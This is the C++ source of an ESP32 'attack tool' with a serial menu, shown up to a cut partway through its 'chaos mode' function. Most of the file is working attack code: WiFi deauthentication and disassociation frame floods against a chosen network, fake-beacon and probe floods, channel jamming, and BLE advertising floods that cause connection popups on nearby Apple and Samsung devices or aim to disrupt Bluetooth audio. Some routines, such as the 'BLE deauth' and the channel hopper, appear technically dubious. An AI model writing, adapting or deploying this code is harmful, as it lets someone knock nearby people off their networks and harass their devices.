/*
 * ESP32 Bluetooth & WiFi Attack Tool v2 - MEGA EDITION
 * Board: ESP32 DevKit V1 (ESP-WROOM-32)
 * 
 * Features:
 * ═══════════════════════════════════════════════════════════
 *  BLUETOOTH ATTACKS
 * ═══════════════════════════════════════════════════════════
 *  [1]  BLE Scanner - Scan all BLE devices
 *  [2]  BT Classic Scanner - Scan Classic BT devices
 *  [3]  BLE Deauth - Disconnect BLE target
 *  [4]  BT A2DP Jam - Jam Bluetooth audio (speakers/headphones)
 *  [5]  BT Pairing Flood - Flood with pairing requests
 *  [6]  BLE Spam (Apple) - Spam Apple device popups
 *  [7]  BLE Spam (Samsung) - Spam Samsung popups
 *  [8]  BLE Spam (All) - Spam all device types
 *  [9]  BT Channel Hopper - Rapid frequency hopping
 * ═══════════════════════════════════════════════════════════
 *  WIFI ATTACKS
 * ═══════════════════════════════════════════════════════════
 *  [A]  WiFi Scanner - Scan all WiFi networks
 *  [B]  WiFi Deauth - Deauth WiFi client
 *  [C]  WiFi Beacon Flood - Flood with fake APs
 *  [D]  WiFi Probe Flood - Flood probe requests
 *  [E]  WiFi Jammer - Jam specific WiFi channel
 * ═══════════════════════════════════════════════════════════
 *  COMBINED ATTACKS
 * ═══════════════════════════════════════════════════════════
 *  [F]  Dual Attack - BT + WiFi simultaneous
 *  [G]  Chaos Mode - All attacks at once
 * ═══════════════════════════════════════════════════════════
 *  SETTINGS
 * ═══════════════════════════════════════════════════════════
 *  [S]  Set Target MAC
 *  [T]  Set Target SSID (WiFi)
 *  [X]  Stop All Attacks
 *  [M]  Show Menu
 *  [I]  Show System Info
 * ═══════════════════════════════════════════════════════════
 */

#include <BLEDevice.h>
#include <BLEServer.h>
#include <BLEUtils.h>
#include <BLE2902.h>
#include <esp_bt.h>
#include <esp_bt_main.h>
#include <esp_gap_bt_api.h>
#include <esp_wifi.h>
#include <WiFi.h>

// ==================== CONFIG ====================
#define LED_PIN 2
#define SERIAL_BAUD 115200
#define MAX_SPAM_DEVICES 10

// ==================== GLOBALS ====================
char currentMode = '0';
String targetMAC = "";
String targetName = "";
String targetSSID = "";
bool attacking = false;
unsigned long attackStart = 0;
unsigned long packetCount = 0;

// ==================== BLE SCANNER ====================
class BLEScanCB : public BLEAdvertisedDeviceCallbacks {
    void onResult(BLEAdvertisedDevice dev) {
        Serial.print("[BLE] ");
        Serial.print(dev.getAddress().toString().c_str());
        Serial.print(" | RSSI:");
        Serial.print(dev.getRSSI());
        Serial.print("dBm | ");
        Serial.print(dev.haveName() ? dev.getName().c_str() : "(unknown)");
        if (dev.haveServiceUUID()) {
            Serial.print(" | UUID:");
            Serial.print(dev.getServiceUUID().toString().c_str());
        }
        Serial.println();
    }
};

// ==================== MENU ====================
void showMenu() {
    Serial.println(F("\n╔══════════════════════════════════════════╗"));
    Serial.println(F("║   ESP32 BT/WiFi ATTACK TOOL v2 MEGA     ║"));
    Serial.println(F("╠══════════════════════════════════════════╣"));
    Serial.println(F("║  ═══ BLUETOOTH ATTACKS ═══              ║"));
    Serial.println(F("║  [1] BLE Scanner                         ║"));
    Serial.println(F("║  [2] BT Classic Scanner                  ║"));
    Serial.println(F("║  [3] BLE Deauth Attack                   ║"));
    Serial.println(F("║  [4] BT A2DP Jam (Audio devices)         ║"));
    Serial.println(F("║  [5] BT Pairing Flood                    ║"));
    Serial.println(F("║  [6] BLE Spam (Apple popups)             ║"));
    Serial.println(F("║  [7] BLE Spam (Samsung popups)           ║"));
    Serial.println(F("║  [8] BLE Spam (All devices)              ║"));
    Serial.println(F("║  [9] BT Channel Hopper                   ║"));
    Serial.println(F("║  ═══ WIFI ATTACKS ═══                   ║"));
    Serial.println(F("║  [A] WiFi Scanner                        ║"));
    Serial.println(F("║  [B] WiFi Deauth Attack                  ║"));
    Serial.println(F("║  [C] WiFi Beacon Flood                   ║"));
    Serial.println(F("║  [D] WiFi Probe Flood                    ║"));
    Serial.println(F("║  [E] WiFi Channel Jammer                 ║"));
    Serial.println(F("║  ═══ COMBINED ═══                        ║"));
    Serial.println(F("║  [F] Dual Attack (BT+WiFi)               ║"));
    Serial.println(F("║  [G] CHAOS MODE (ALL ATTACKS)            ║"));
    Serial.println(F("║  ═══ SETTINGS ═══                        ║"));
    Serial.println(F("║  [S] Set Target MAC                      ║"));
    Serial.println(F("║  [T] Set Target SSID                     ║"));
    Serial.println(F("║  [X] Stop All Attacks                    ║"));
    Serial.println(F("║  [M] Show Menu                           ║"));
    Serial.println(F("║  [I] System Info                         ║"));
    Serial.println(F("╚══════════════════════════════════════════╝"));
    
    Serial.print(F("\n> Target MAC: "));
    Serial.println(targetMAC.length() > 0 ? targetMAC : "NONE");
    Serial.print(F("> Target SSID: "));
    Serial.println(targetSSID.length() > 0 ? targetSSID : "NONE");
    Serial.print(F("> Uptime: "));
    Serial.print(millis() / 1000);
    Serial.println(F("s\n"));
}

// ==================== SYSTEM INFO ====================
void showSystemInfo() {
    Serial.println(F("\n=== SYSTEM INFO ==="));
    Serial.print(F("Chip: "));
    Serial.println(ESP.getChipModel());
    Serial.print(F("Revision: "));
    Serial.println(ESP.getChipRevision());
    Serial.print(F("Cores: "));
    Serial.println(ESP.getChipCores());
    Serial.print(F("CPU Freq: "));
    Serial.print(ESP.getCpuFreqMHz());
    Serial.println(F(" MHz"));
    Serial.print(F("Flash: "));
    Serial.print(ESP.getFlashChipSize() / 1024 / 1024);
    Serial.println(F(" MB"));
    Serial.print(F("Free Heap: "));
    Serial.print(ESP.getFreeHeap());
    Serial.println(F(" bytes"));
    Serial.print(F("BT: "));
    Serial.println(F("Classic + BLE"));
    Serial.print(F("WiFi: "));
    Serial.println(F("802.11 b/g/n"));
}

// ==================== 1. BLE SCANNER ====================
void cmd_BLEScan() {
    Serial.println(F("\n[*] BLE SCAN - 10 seconds..."));
    Serial.println(F("────────────────────────────────────────"));
    
    BLEDevice::init("");
    BLEScan* scan = BLEDevice::getScan();
    scan->setAdvertisedDeviceCallbacks(new BLEScanCB());
    scan->setActiveScan(true);
    scan->setInterval(100);
    scan->setWindow(99);
    
    BLEScanResults results = scan->start(10, false);
    Serial.println(F("────────────────────────────────────────"));
    Serial.printf("[*] Found %d BLE devices\n\n", results.getCount());
    
    scan->clearResults();
    BLEDevice::deinit(true);
}

// ==================== 2. BT CLASSIC SCANNER ====================
void cmd_BTClassicScan() {
    Serial.println(F("\n[*] BT CLASSIC SCAN - 10 seconds..."));
    Serial.println(F("────────────────────────────────────────"));
    
    // Initialize BT Classic
    if (!btStart()) {
        Serial.println(F("[!] BT init failed"));
        return;
    }
    
    esp_bt_controller_config_t bt_cfg = BT_CONTROLLER_INIT_CONFIG_DEFAULT();
    esp_bt_controller_init(&bt_cfg);
    esp_bt_controller_enable(ESP_BT_MODE_CLASSIC_BT);
    
    // Set device name
    esp_bt_dev_set_device_name("ESP32-Scanner");
    
    // Start discovery
    esp_bt_gap_start_discovery(ESP_BT_INQ_MODE_GENERAL, 10, 0);
    
    Serial.println(F("[*] Scanning for Classic BT devices..."));
    Serial.println(F("[*] Devices will appear as they respond to inquiry"));
    
    delay(11000);  // Wait for discovery
    
    esp_bt_gap_cancel_discovery();
    esp_bt_controller_disable();
    
    Serial.println(F("────────────────────────────────────────"));
    Serial.println(F("[*] Classic BT scan complete\n"));
}

// ==================== 3. BLE DEAUTH ====================
void cmd_BLEDeauth() {
    if (targetMAC.length() == 0) {
        Serial.println(F("[!] Set target MAC first! (press S)"));
        return;
    }
    
    Serial.println(F("\n[*] BLE DEAUTH ATTACK"));
    Serial.printf("[*] Target: %s (%s)\n", targetMAC.c_str(), targetName.c_str());
    Serial.println(F("[*] Press X to stop\n"));
    
    attacking = true;
    packetCount = 0;
    attackStart = millis();
    
    BLEDevice::init("DeauthTool");
    
    // Create multiple BLE servers to flood
    for (int i = 0; i < 3; i++) {
        BLEServer* srv = BLEDevice::createServer();
        BLEService* svc = srv->createService(BLEUUID("1800"));
        svc->start();
    }
    
    while (attacking) {
        // Rapid advertising cycle
        BLEAdvertising* adv = BLEDevice::getAdvertising();
        
        // Method 1: Standard advertising flood
        adv->setMinInterval(0x20);  // Minimum interval
        adv->setMaxInterval(0x40);
        BLEDevice::startAdvertising();
        delay(50);
        BLEDevice::stopAdvertising();
        delay(20);
        
        // Method 2: Scan response flood
        BLEAdvertisementData scanResp;
        scanResp.setName("Device");
        adv->setScanResponseData(scanResp);
        BLEDevice::startAdvertising();
        delay(30);
        BLEDevice::stopAdvertising();
        
        packetCount++;
        
        if (millis() - attackStart > 2000) {
            Serial.printf("[*] Deauth: %lu packets sent\n", packetCount);
            attackStart = millis();
        }
        
        checkSerialStop();
    }
    
    BLEDevice::deinit(true);
    Serial.println(F("[*] BLE Deauth stopped\n"));
}

// ==================== 4. BT A2DP JAM ====================
void cmd_A2DPJam() {
    Serial.println(F("\n[*] BT A2DP JAM - Targeting audio devices"));
    Serial.println(F("[*] This jams Bluetooth speakers/headphones"));
    Serial.println(F("[*] Press X to stop\n"));
    
    attacking = true;
    packetCount = 0;
    attackStart = millis();
    
    // Initialize in Dual mode
    BLEDevice::init("A2DP-Jam");
    
    while (attacking) {
        // Flood with A2DP connection attempts
        BLEAdvertising* adv = BLEDevice::getAdvertising();
        
        // Spoof as audio device
        BLEAdvertisementData advData;
        advData.setFlags(0x06);
        advData.setName("JBL Flip");  // Common speaker name
        advData.setManufacturerData("\x4C\x00");  // Apple ID for confusion
        adv->setAdvertisementData(advData);
        adv->addServiceUUID(BLEUUID("110B"));  // A2DP Sink UUID
        
        BLEDevice::startAdvertising();
        delay(100);
        BLEDevice::stopAdvertising();
        delay(50);
        
        // Also spam with different speaker names
        const char* speakerNames[] = {"JBL", "Sony", "Bose", "Samsung", "Xiaomi"};
        for (int i = 0; i < 5; i++) {
            BLEAdvertisementData fakeAdv;
            fakeAdv.setFlags(0x06);
            fakeAdv.setName(speakerNames[i]);
            adv->setAdvertisementData(fakeAdv);
            BLEDevice::startAdvertising();
            delay(80);
            BLEDevice::stopAdvertising();
            delay(30);
        }
        
        packetCount++;
        
        if (millis() - attackStart > 2000) {
            Serial.printf("[*] A2DP Jam: %lu packets\n", packetCount);
            attackStart = millis();
        }
        
        checkSerialStop();
    }
    
    BLEDevice::deinit(true);
    Serial.println(F("[*] A2DP Jam stopped\n"));
}

// ==================== 5. BT PAIRING FLOOD ====================
void cmd_PairingFlood() {
    Serial.println(F("\n[*] BT PAIRING FLOOD"));
    Serial.println(F("[*] Flooding target with pairing requests"));
    Serial.println(F("[*] Press X to stop\n"));
    
    attacking = true;
    packetCount = 0;
    attackStart = millis();
    
    BLEDevice::init("PairFlood");
    
    while (attacking) {
        // Create fake devices that try to pair
        for (int i = 0; i < 5; i++) {
            BLEServer* srv = BLEDevice::createServer();
            BLEService* svc = srv->createService(BLEUUID("1800"));
            svc->start();
            
            BLEAdvertising* adv = BLEDevice::getAdvertising();
            BLEAdvertisementData data;
            data.setFlags(0x05);  // LE Limited Discoverable
            data.setName("Phone_" + String(i));
            adv->setAdvertisementData(data);
            adv->setMinInterval(0x20);
            adv->setMaxInterval(0x40);
            
            BLEDevice::startAdvertising();
            delay(100);
            BLEDevice::stopAdvertising();
            
            // Delete server
            srv->removeService(svc);
            delete svc;
            delete srv;
        }
        
        packetCount += 5;
        
        if (millis() - attackStart > 2000) {
            Serial.printf("[*] Pairing flood: %lu requests\n", packetCount);
            attackStart = millis();
        }
        
        checkSerialStop();
    }
    
    BLEDevice::deinit(true);
    Serial.println(F("[*] Pairing flood stopped\n"));
}

// ==================== 6. BLE SPAM (APPLE) ====================
void cmd_BLESpamApple() {
    Serial.println(F("\n[*] BLE SPAM - Apple Device Popups"));
    Serial.println(F("[*] Causes 'Connect?' popups on nearby Apple devices"));
    Serial.println(F("[*] Press X to stop\n"));
    
    attacking = true;
    packetCount = 0;
    attackStart = millis();
    
    BLEDevice::init("AppleSpam");
    BLEAdvertising* adv = BLEDevice::getAdvertising();
    
    // Apple Continuity Protocol payloads
    // These trigger pairing popups on iPhones/iPads
    uint8_t appleData1[] = {0x01, 0x07, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06};
    uint8_t appleData2[] = {0x01, 0x0A, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06};
    uint8_t appleData3[] = {0x01, 0x0E, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06};
    uint8_t appleData4[] = {0x01, 0x16, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06};
    
    while (attacking) {
        // Cycle through different Apple device types
        uint8_t* payloads[] = {appleData1, appleData2, appleData3, appleData4};
        String names[] = {"AirPods", "Apple TV", "MacBook", "Apple Watch"};
        
        for (int i = 0; i < 4; i++) {
            BLEAdvertisementData advData;
            advData.setFlags(0x01);
            advData.setManufacturerData(String((char*)payloads[i], 8));
            adv->setAdvertisementData(advData);
            
            BLEDevice::startAdvertising();
            delay(100);
            BLEDevice::stopAdvertising();
            delay(50);
            
            packetCount++;
        }
        
        if (millis() - attackStart > 3000) {
            Serial.printf("[*] Apple spam: %lu popups triggered\n", packetCount);
            attackStart = millis();
        }
        
        checkSerialStop();
    }
    
    BLEDevice::deinit(true);
    Serial.println(F("[*] Apple spam stopped\n"));
}

// ==================== 7. BLE SPAM (SAMSUNG) ====================
void cmd_BLESpamSamsung() {
    Serial.println(F("\n[*] BLE SPAM - Samsung Device Popups"));
    Serial.println(F("[*] Causes popups on nearby Samsung devices"));
    Serial.println(F("[*] Press X to stop\n"));
    
    attacking = true;
    packetCount = 0;
    attackStart = millis();
    
    BLEDevice::init("SamsungSpam");
    BLEAdvertising* adv = BLEDevice::getAdvertising();
    
    while (attacking) {
        // Samsung Galaxy Buds, Watch, etc.
        uint8_t samsungData[] = {0x42, 0x09, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08};
        
        BLEAdvertisementData advData;
        advData.setFlags(0x06);
        advData.setManufacturerData(String((char*)samsungData, 10));
        adv->setAdvertisementData(advData);
        
        BLEDevice::startAdvertising();
        delay(150);
        BLEDevice::stopAdvertising();
        delay(100);
        
        packetCount++;
        
        if (millis() - attackStart > 3000) {
            Serial.printf("[*] Samsung spam: %lu popups\n", packetCount);
            attackStart = millis();
        }
        
        checkSerialStop();
    }
    
    BLEDevice::deinit(true);
    Serial.println(F("[*] Samsung spam stopped\n"));
}

// ==================== 8. BLE SPAM (ALL) ====================
void cmd_BLESpamAll() {
    Serial.println(F("\n[*] BLE SPAM - ALL DEVICES"));
    Serial.println(F("[*] Popups on Apple, Samsung, and more"));
    Serial.println(F("[*] Press X to stop\n"));
    
    attacking = true;
    packetCount = 0;
    attackStart = millis();
    
    BLEDevice::init("SpamAll");
    BLEAdvertising* adv = BLEDevice::getAdvertising();
    
    while (attacking) {
        // Apple
        uint8_t appleData[] = {0x01, 0x07, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06};
        BLEAdvertisementData advData1;
        advData1.setManufacturerData(String((char*)appleData, 8));
        adv->setAdvertisementData(advData1);
        BLEDevice::startAdvertising();
        delay(100);
        BLEDevice::stopAdvertising();
        delay(50);
        
        // Samsung
        uint8_t samsungData[] = {0x42, 0x09, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06};
        BLEAdvertisementData advData2;
        advData2.setManufacturerData(String((char*)samsungData, 8));
        adv->setAdvertisementData(advData2);
        BLEDevice::startAdvertising();
        delay(100);
        BLEDevice::stopAdvertising();
        delay(50);
        
        // Generic
        BLEAdvertisementData advData3;
        advData3.setFlags(0x06);
        advData3.setName("Free_WiFi");
        adv->setAdvertisementData(advData3);
        BLEDevice::startAdvertising();
        delay(100);
        BLEDevice::stopAdvertising();
        
        packetCount += 3;
        
        if (millis() - attackStart > 3000) {
            Serial.printf("[*] All spam: %lu packets\n", packetCount);
            attackStart = millis();
        }
        
        checkSerialStop();
    }
    
    BLEDevice::deinit(true);
    Serial.println(F("[*] All spam stopped\n"));
}

// ==================== 9. BT CHANNEL HOPPER ====================
void cmd_BTChannelHopper() {
    Serial.println(F("\n[*] BT CHANNEL HOPPER"));
    Serial.println(F("[*] Rapidly hopping across all 79 BT channels"));
    Serial.println(F("[*] Disrupts all BT communications in range"));
    Serial.println(F("[*] Press X to stop\n"));
    
    attacking = true;
    packetCount = 0;
    attackStart = millis();
    
    // Enable WiFi for channel manipulation
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    
    BLEDevice::init("ChannelHop");
    
    while (attacking) {
        // Hop through WiFi channels (overlaps BT frequencies)
        for (int ch = 1; ch <= 13; ch++) {
            esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
            
            // Also hop BLE advertising channels (37, 38, 39)
            BLEAdvertising* adv = BLEDevice::getAdvertising();
            adv->setMinInterval(0x20);
            adv->setMaxInterval(0x20);
            
            BLEDevice::startAdvertising();
            delayMicroseconds(500);
            BLEDevice::stopAdvertising();
            
            packetCount++;
        }
        
        if (millis() - attackStart > 2000) {
            Serial.printf("[*] Channel hop: %lu cycles\n", packetCount);
            attackStart = millis();
        }
        
        checkSerialStop();
    }
    
    WiFi.mode(WIFI_OFF);
    BLEDevice::deinit(true);
    Serial.println(F("[*] Channel hop stopped\n"));
}

// ==================== A. WiFi SCANNER ====================
void cmd_WiFiScan() {
    Serial.println(F("\n[*] WiFi SCAN - 5 seconds..."));
    Serial.println(F("────────────────────────────────────────"));
    
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);
    
    int n = WiFi.scanNetworks();
    
    for (int i = 0; i < n; i++) {
        Serial.printf("[WiFi] %s | CH:%d | RSSI:%d dBm | %s | %s\n",
            WiFi.SSID(i).c_str(),
            WiFi.channel(i),
            WiFi.RSSI(i),
            WiFi.BSSIDstr(i).c_str(),
            WiFi.encryptionType(i) == WIFI_AUTH_OPEN ? "OPEN" : "ENCRYPTED"
        );
    }
    
    Serial.println(F("────────────────────────────────────────"));
    Serial.printf("[*] Found %d WiFi networks\n\n", n);
    
    WiFi.scanDelete();
}

// ==================== B. WiFi DEAUTH ====================
void cmd_WiFiDeauth() {
    if (targetSSID.length() == 0 && targetMAC.length() == 0) {
        Serial.println(F("[!] Set target SSID (T) or MAC (S) first!"));
        return;
    }
    
    Serial.println(F("\n[*] WiFi DEAUTH ATTACK"));
    Serial.printf("[*] Target: %s\n", targetSSID.length() > 0 ? targetSSID.c_str() : targetMAC.c_str());
    Serial.println(F("[*] Press X to stop\n"));
    
    attacking = true;
    packetCount = 0;
    attackStart = millis();
    
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    
    // Find target channel
    int targetChannel = 1;
    if (targetSSID.length() > 0) {
        int n = WiFi.scanNetworks();
        for (int i = 0; i < n; i++) {
            if (WiFi.SSID(i) == targetSSID) {
                targetChannel = WiFi.channel(i);
                targetMAC = WiFi.BSSIDstr(i);
                break;
            }
        }
        WiFi.scanDelete();
    }
    
    esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
    
    // Deauth frame
    uint8_t deauthPacket[] = {
        0xC0, 0x00, 0x3A, 0x01,
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // Destination: broadcast
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Source: AP
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID: AP
        0x00, 0x00,                            // Sequence
        0x07, 0x00                             // Reason: Class 3 frame
    };
    
    // Parse target MAC into packet
    if (targetMAC.length() == 17) {
        uint8_t mac[6];
        sscanf(targetMAC.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
               &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]);
        memcpy(&deauthPacket[10], mac, 6);  // Source
        memcpy(&deauthPacket[16], mac, 6);  // BSSID
    }
    
    while (attacking) {
        // Send deauth frames
        esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
        delay(10);
        
        // Also send disassociation
        deauthPacket[0] = 0xA0;  // Disassociation
        esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
        delay(10);
        deauthPacket[0] = 0xC0;  // Back to deauth
        
        packetCount += 2;
        
        if (millis() - attackStart > 2000) {
            Serial.printf("[*] WiFi deauth: %lu frames sent\n", packetCount);
            attackStart = millis();
        }
        
        checkSerialStop();
    }
    
    WiFi.mode(WIFI_OFF);
    Serial.println(F("[*] WiFi deauth stopped\n"));
}

// ==================== C. WiFi BEACON FLOOD ====================
void cmd_WiFiBeaconFlood() {
    Serial.println(F("\n[*] WiFi BEACON FLOOD"));
    Serial.println(F("[*] Creating fake WiFi networks"));
    Serial.println(F("[*] Press X to stop\n"));
    
    attacking = true;
    packetCount = 0;
    attackStart = millis();
    
    WiFi.mode(WIFI_STA);
    
    // Fake SSIDs to broadcast
    const char* fakeSSIDs[] = {
        "FREE_WIFI", "FREE_INTERNET", "CONNECT_HERE",
        "STARBUCKS_WIFI", "MCDONALDS_FREE", "AIRPORT_WIFI",
        "HOTEL_GUEST", "COVID19_TRACKER", "FBI_SURVEILLANCE",
        "VIRUS_DOWNLOAD", "HACKED_NETWORK", "NO_INTERNET"
    };
    
    while (attacking) {
        for (int i = 0; i < 12; i++) {
            // Create beacon frame
            uint8_t beaconPacket[128] = {
                0x80, 0x00,                          // Beacon
                0x00, 0x00,                          // Duration
                0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // Destination: broadcast
                0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF,  // Source (fake MAC)
                0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF,  // BSSID
                0x00, 0x00,                          // Sequence
                // Fixed parameters
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Timestamp
                0x64, 0x00,                          // Beacon interval
                0x01, 0x04,                          // Capability
            };
            
            // Add SSID
            int ssidLen = strlen(fakeSSIDs[i]);
            beaconPacket[37] = 0x00;  // SSID tag
            beaconPacket[38] = ssidLen;
            memcpy(&beaconPacket[39], fakeSSIDs[i], ssidLen);
            
            // Add supported rates
            beaconPacket[39 + ssidLen] = 0x01;  // Supported rates tag
            beaconPacket[40 + ssidLen] = 0x08;  // Length
            beaconPacket[41 + ssidLen] = 0x82;  // 1 Mbps
            beaconPacket[42 + ssidLen] = 0x84;  // 2 Mbps
            beaconPacket[43 + ssidLen] = 0x8B;  // 5.5 Mbps
            beaconPacket[44 + ssidLen] = 0x96;  // 11 Mbps
            beaconPacket[45 + ssidLen] = 0x24;  // 18 Mbps
            beaconPacket[46 + ssidLen] = 0x30;  // 24 Mbps
            beaconPacket[47 + ssidLen] = 0x48;  // 36 Mbps
            beaconPacket[48 + ssidLen] = 0x6C;  // 54 Mbps
            
            // Randomize source MAC
            beaconPacket[10] = random(0, 255);
            beaconPacket[11] = random(0, 255);
            beaconPacket[12] = random(0, 255);
            
            // Send on random channels
            esp_wifi_set_channel(random(1, 14), WIFI_SECOND_CHAN_NONE);
            esp_wifi_80211_tx(WIFI_IF_STA, beaconPacket, 49 + ssidLen, false);
            
            packetCount++;
        }
        
        delay(100);
        
        if (millis() - attackStart > 3000) {
            Serial.printf("[*] Beacon flood: %lu packets | %d fake APs\n", packetCount, 12);
            attackStart = millis();
        }
        
        checkSerialStop();
    }
    
    WiFi.mode(WIFI_OFF);
    Serial.println(F("[*] Beacon flood stopped\n"));
}

// ==================== D. WiFi PROBE FLOOD ====================
void cmd_WiFiProbeFlood() {
    Serial.println(F("\n[*] WiFi PROBE REQUEST FLOOD"));
    Serial.println(F("[*] Flooding with probe requests"));
    Serial.println(F("[*] Press X to stop\n"));
    
    attacking = true;
    packetCount = 0;
    attackStart = millis();
    
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    
    const char* probeSSIDs[] = {
        "HOME", "OFFICE", "WIFI", "INTERNET", "NETWORK",
        "5G", "FREE", "PUBLIC", "GUEST", "DEFAULT"
    };
    
    while (attacking) {
        for (int i = 0; i < 10; i++) {
            // Probe request frame
            uint8_t probePacket[64] = {
                0x40, 0x00,                          // Probe Request
                0x00, 0x00,                          // Duration
                0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // Destination: broadcast
                0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF,  // Source
                0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // BSSID
                0x00, 0x00,                          // Sequence
            };
            
            // Add SSID
            int ssidLen = strlen(probeSSIDs[i]);
            probePacket[25] = 0x00;
            probePacket[26] = ssidLen;
            memcpy(&probePacket[27], probeSSIDs[i], ssidLen);
            
            // Randomize MAC
            probePacket[10] = random(0, 255);
            probePacket[11] = random(0, 255);
            probePacket[12] = random(0, 255);
            
            esp_wifi_set_channel(random(1, 14), WIFI_SECOND_CHAN_NONE);
            esp_wifi_80211_tx(WIFI_IF_STA, probePacket, 27 + ssidLen, false);
            
            packetCount++;
        }
        
        delay(50);
        
        if (millis() - attackStart > 2000) {
            Serial.printf("[*] Probe flood: %lu packets\n", packetCount);
            attackStart = millis();
        }
        
        checkSerialStop();
    }
    
    WiFi.mode(WIFI_OFF);
    Serial.println(F("[*] Probe flood stopped\n"));
}

// ==================== E. WiFi CHANNEL JAMMER ====================
void cmd_WiFiJammer() {
    Serial.println(F("\n[*] WiFi CHANNEL JAMMER"));
    Serial.println(F("[*] Jamming all WiFi channels (1-13)"));
    Serial.println(F("[*] Press X to stop\n"));
    
    attacking = true;
    packetCount = 0;
    attackStart = millis();
    
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    
    // Noise packet
    uint8_t noisePacket[] = {
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
        0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF,
        0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF,
        0x00, 0x00,
        0x4A, 0x41, 0x4D, 0x4D, 0x45, 0x52  // "JAMMER"
    };
    
    while (attacking) {
        for (int ch = 1; ch <= 13; ch++) {
            esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
            
            // Send multiple noise packets per channel
            for (int j = 0; j < 10; j++) {
                noisePacket[10] = random(0, 255);
                noisePacket[11] = random(0, 255);
                esp_wifi_80211_tx(WIFI_IF_STA, noisePacket, sizeof(noisePacket), false);
                packetCount++;
            }
        }
        
        if (millis() - attackStart > 2000) {
            Serial.printf("[*] WiFi jam: %lu noise packets\n", packetCount);
            attackStart = millis();
        }
        
        checkSerialStop();
    }
    
    WiFi.mode(WIFI_OFF);
    Serial.println(F("[*] WiFi jammer stopped\n"));
}

// ==================== F. DUAL ATTACK ====================
void cmd_DualAttack() {
    Serial.println(F("\n[*] DUAL ATTACK - BT + WiFi"));
    Serial.println(F("[*] Simultaneous Bluetooth and WiFi attack"));
    Serial.println(F("[*] Press X to stop\n"));
    
    attacking = true;
    packetCount = 0;
    attackStart = millis();
    
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    BLEDevice::init("DualAttack");
    
    while (attacking) {
        // WiFi channel hop + noise
        for (int ch = 1; ch <= 13; ch++) {
            esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
            
            uint8_t noise[] = {0xFF, 0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF, 0x00, 0x00};
            esp_wifi_80211_tx(WIFI_IF_STA, noise, sizeof(noise), false);
            
            // BLE advertising
            BLEAdvertising* adv = BLEDevice::getAdvertising();
            adv->setMinInterval(0x20);
            BLEDevice::startAdvertising();
            delayMicroseconds(100);
            BLEDevice::stopAdvertising();
            
            packetCount++;
        }
        
        if (millis() - attackStart > 2000) {
            Serial.printf("[*] Dual attack: %lu packets\n", packetCount);
            attackStart = millis();
        }
        
        checkSerialStop();
    }
    
    WiFi.mode(WIFI_OFF);
    BLEDevice::deinit(true);
    Serial.println(F("[*] Dual attack stopped\n"));
}

// ==================== G. CHAOS MODE ====================
void cmd_ChaosMode() {
    Serial.println(F("\n*** CHAOS MODE ACTIVATED ***"));
    Serial.println(F("[*] ALL ATTACKS SIMULTANEOUSLY"));
    Serial.println(F("[*] BT Jam + WiFi Jam + Beacon Flood + BLE Spam"));
    Serial.println(F("[*] Press X to stop\n"));
    
    attacking = true;
    packetCount = 0;
    attackStart = millis();
    
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    BLEDevice::init("CHAOS");
    
    while (attacking) {
        // === WiFi attacks ===
        for (int ch = 1; ch <= 13; ch++) {
            esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
            
            // Noise
            uint8_t noise[] = {0xFF, 0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF, 0x00, 0x00};
            esp_wifi_80211_tx(WIFI_IF_STA, noise, sizeof(noise), false);
            
            // Fake beacon
            uint8_t beacon[64] = {0x80, 0x00};
            beacon[10] = random(0, 255);
            beacon[11] = random(0, 255);
            beacon[12] = random(0, 255);
            memcpy(&beacon[39], "CHAOS", 5);
            beacon[37] = 0x00;
            beacon[38] = 5;
            esp_wifi_80211_tx(WIFI_IF_STA, beacon, 44, false);
            
            packetCount++;
        }
        
        // === BLE attacks ===
        // Apple spam
        uint8_t apple[] = {0x01, 0x07, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06};
        BLEAdvertisementData advData;
        advData.setManufacturerData(String((char*)apple, 8));
        BLEAdvertising* adv = BLEDevice::getAdvertising();
        adv->setAdvertisementData(advData);
        BLEDevice::startAdvertising();
        delay(50);
        BLEDevice::stopAdvertising();
        
        // Speaker spam
        const char* speakers[] = {"JBL", "Sony", "Bose"};
        for (int i = 0; i < 3; i++) {
            BLEAdvertisementData spkData;
            spkData.setName(speakers[i]);
            adv->setAdvertisementData(spkData);
            BLEDevice::startAdvertising();
